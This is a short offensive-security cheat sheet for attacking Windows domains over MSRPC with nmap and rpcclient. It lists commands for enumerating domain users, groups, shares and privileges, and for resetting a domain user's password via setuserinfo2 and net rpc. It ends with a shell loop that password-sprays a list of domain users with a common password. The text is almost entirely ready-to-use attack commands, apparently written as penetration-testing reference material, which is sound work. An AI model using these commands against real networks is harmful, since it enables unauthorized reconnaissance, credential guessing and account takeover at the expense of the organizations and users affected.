`` Scanning

    ~$ nmap -n -v -sV -Pn -p135 --script msrpc-enum --script-args vulns.showall VAR_TARGET_HOST

`` Connect

    ~$ rpcclient -U VAR_TARGET_DOMAIN/VAR_USERNAME VAR_TARGET_HOST

`` Version of the target Windows machine

    rpcclient $> srvinfo

`` Specific user / computer information by RID

    rpcclient $> queryuser VAR_RID

`` Domain

    rpcclient $> querydominfo

`` Domain users, groups, shares, privileges

    rpcclient $> enumdomusers
    rpcclient $> enumdomgroups
    rpcclient $> querygroup VAR_RID
    rpcclient $> querygroupmem VAR_RID
    rpcclient $> queryuser VAR_RID
    rpcclient $> netshareenum
    rpcclient $> netshareenumall
    rpcclient $> enumprivs

`` Reset domain user password

    rpcclient $> setuserinfo2 VAR_USERNAME 23 'VAR_PASSWORD'

    ~$ net rpc password administrator -U VAR_USERNAME -S VAR_TARGET_HOST

`` Check domain password policy

    rpcclient $> getdompwinfo
    rpcclient $> getusrdompwinfo VAR_RID

`` Password spraying

    ~$ rpcclient -U "VAR_USERNAME%VAR_PASSWORD" -c "getusername;quit" VAR_TARGET_HOST

    -- Snippet

    VAR_PASSWORD=Passw0rd
    VAR_TARGET_HOST=10.0.0.1
    for user in `cat domain-users.txt`; do
        echo -n "$user:$VAR_PASSWORD" && rpcclient -U "$user:$VAR_PASSWORD" -c "getusername;quit" $VAR_TARGET_HOST
    done
